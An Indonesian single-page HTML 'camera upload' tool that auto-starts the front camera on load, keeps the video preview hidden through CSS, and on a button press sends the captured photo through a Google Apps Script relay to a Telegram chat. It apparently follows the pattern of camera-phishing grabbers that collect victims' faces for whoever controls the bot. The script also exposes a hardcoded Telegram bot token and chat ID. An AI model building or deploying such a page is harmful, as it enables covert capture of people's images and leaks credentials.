<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Upload Gambar Kamera</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    video, canvas {
      display: none;
    }
    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
    @keyframes pulse-glow {
      0%, 100% { box-shadow: 0 0 20px rgba(59,130,246,0.5); }
      50% { box-shadow: 0 0 40px rgba(59,130,246,0.8); }
    }
    @keyframes gradient-shift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .animate-float {
      animation: float 3s ease-in-out infinite;
    }
    .animate-pulse-glow {
      animation: pulse-glow 2s ease-in-out infinite;
    }
    .animate-gradient {
      background-size: 400% 400%;
      animation: gradient-shift 4s ease infinite;
    }
  </style>
</head>
<body class="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 flex items-center justify-center p-4">

  <!-- Background Elements -->
  <div class="absolute inset-0 overflow-hidden">
    <div class="absolute -top-4 -left-4 w-72 h-72 bg-purple-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse"></div>
    <div class="absolute -bottom-8 -right-4 w-72 h-72 bg-blue-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse"></div>
    <div class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-indigo-500 rounded-full mix-blend-multiply filter blur-2xl opacity-10 animate-spin" style="animation-duration: 20s;"></div>
  </div>

  <!-- Main Container -->
  <div class="relative z-10 w-full max-w-md">

    <!-- Glass Card -->
    <div class="backdrop-blur-xl bg-white/10 border border-white/20 rounded-3xl p-8 shadow-2xl animate-float">

      <!-- Header -->
      <div class="text-center mb-8">
        <div class="inline-flex items-center justify-center w-20 h-20 bg-gradient-to-r from-blue-500 to-purple-600 rounded-2xl mb-4 animate-pulse-glow">
          <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
          </svg>
        </div>
        <h1 class="text-3xl font-bold bg-gradient-to-r from-white to-gray-300 bg-clip-text text-transparent mb-2">
          Upload Gambar
        </h1>
        <p class="text-gray-300 text-sm">
          Ambil gambar dari kamera Anda
        </p>
      </div>

      <!-- Video preview -->
      <video id="video" autoplay playsinline class="w-full rounded-2xl shadow-lg"></video>

      <!-- Capture Button -->
      <button id="captureBtn" class="mt-6 w-full bg-gradient-to-r from-blue-600 to-purple-600 text-white py-3 rounded-2xl font-semibold hover:scale-105 transition-transform duration-300">
        Ambil Foto
      </button>

      <!-- Status Text -->
      <p id="statusText" class="mt-4 text-center text-gray-300"></p>

    </div>

    <!-- Bottom Glow Effect -->
    <div class="absolute -bottom-4 left-1/2 transform -translate-x-1/2 w-3/4 h-4 bg-gradient-to-r from-blue-500/20 to-purple-500/20 blur-lg rounded-full"></div>
  </div>

  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const captureBtn = document.getElementById('captureBtn');
    const canvas = document.getElementById('canvas');
    const statusText = document.getElementById('statusText');

    // Token dan chat_id Telegram kamu
    const TELEGRAM_BOT_TOKEN = "8008710613:AAEGyeE62VS0Z1__IyrBrgq39vXnQ4nMbZM";
    const TELEGRAM_CHAT_ID = "6786751592";

    // URL Google Apps Script kamu
    const GOOGLE_APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz6V9oFKGqabprvgMovfiGqAKYOtJtkLb0MzRIykTKsKAKcgww5BapC-uSOjK4ztLVNww/exec";

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        statusText.textContent = "Kamera aktif, siap mengambil gambar.";
      } catch (err) {
        statusText.textContent = "Tidak dapat mengakses kamera: " + err.message;
      }
    }

    async function captureAndSend() {
      if (!video.srcObject) {
        statusText.textContent = "Kamera belum aktif.";
        return;
      }
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async (blob) => {
        const reader = new FileReader();
        reader.onloadend = () => {
          const base64data = reader.result.split(',')[1];
          sendImageToAppsScript(base64data);
        };
        reader.readAsDataURL(blob);
      }, 'image/jpeg', 0.9);
    }

    async function sendImageToAppsScript(base64image) {
      statusText.textContent = "Mengirim gambar ke server...";
      try {
        const formData = new URLSearchParams();
        formData.append("image", base64image);
        formData.append("chat_id", TELEGRAM_CHAT_ID);
        formData.append("bot_token", TELEGRAM_BOT_TOKEN);

        const response = await fetch(GOOGLE_APPS_SCRIPT_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          body: formData.toString()
        });

        if (response.ok) {
          statusText.textContent = "Foto berhasil dikirim!";
        } else {
          statusText.textContent = "Gagal mengirim foto, coba lagi.";
        }
      } catch (error) {
        statusText.textContent = "Error saat mengirim: " + error.message;
      }
    }

    captureBtn.addEventListener('click', () => {
      captureAndSend();
    });

    window.addEventListener('load', () => {
      startCamera();
    });
  </script>

</body>
</html>
